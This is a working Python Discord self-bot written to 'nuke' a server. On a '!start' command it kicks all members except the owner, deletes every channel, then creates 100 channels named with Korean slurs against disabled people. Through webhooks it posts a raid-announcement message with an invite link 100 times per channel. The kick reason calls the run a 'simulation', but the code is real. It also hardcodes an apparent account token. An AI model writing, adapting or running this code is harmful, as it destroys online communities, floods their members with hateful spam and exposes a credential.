import asyncio
import discord
from discord.ext import commands

bot = commands.Bot(command_prefix="!", self_bot=True)

@bot.event
async def on_ready():
    print(f"wait: {bot.user}")
    print("!start")

@bot.event
async def on_message(message):
    if message.content.startswith("!start"):
        try:
            await message.delete()
        except Exception:
            pass
    await bot.process_commands(message)

@bot.command(name="start")
async def terror_protocol(ctx):
    guild = ctx.guild
    if not guild:
        return

    async def kick_member(member):
        if member != guild.me and member != guild.owner:
            try:
                await member.kick(reason="Protocol Ironclad Simulation")
            except Exception:
                pass

    await asyncio.gather(*(kick_member(m) for m in guild.members))

    async def delete_channel(channel):
        try:
            await channel.delete()
        except Exception:
            pass

    await asyncio.gather(*(delete_channel(c) for c in list(guild.channels)))

    payload_message = (
        "## @everyone 이서버는 현제 노애미즈크루에 다 털렸음을 알립니다  "
        "https://discord.gg/p7h6eCXwbD  "
        " https://cdn.discordapp.com/attachments/1535972282244145173/1535972390562041876/noaemis.gif?ex=6a79b542&is=6a7863c2&hm=8e47c4e8243d8a4e25d084d1b7383433ff8b5a74155af706db2fdbb9c5ce43d6& "
    )

    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f"무릎꿇어라장애인들아{i+1}")
            # 웹훅 생성 및 메시지 발송
            webhook = await channel.create_webhook(name=f"노애미즈의 노예{i+1}")
            for _ in range(100):
                await webhook.send(payload_message)
        except Exception:
            pass

    await asyncio.gather(*(create_and_spam(i) for i in range(100)))

if __name__ == "__main__":
    token = "MTUzNTk0MzU1MjY3OTI4MDcwMA.GWRnUe.BudAMRq0-VkXyaCLM7Q8J4o5F2V9G4cMJyBjIc"
    bot.run(token)
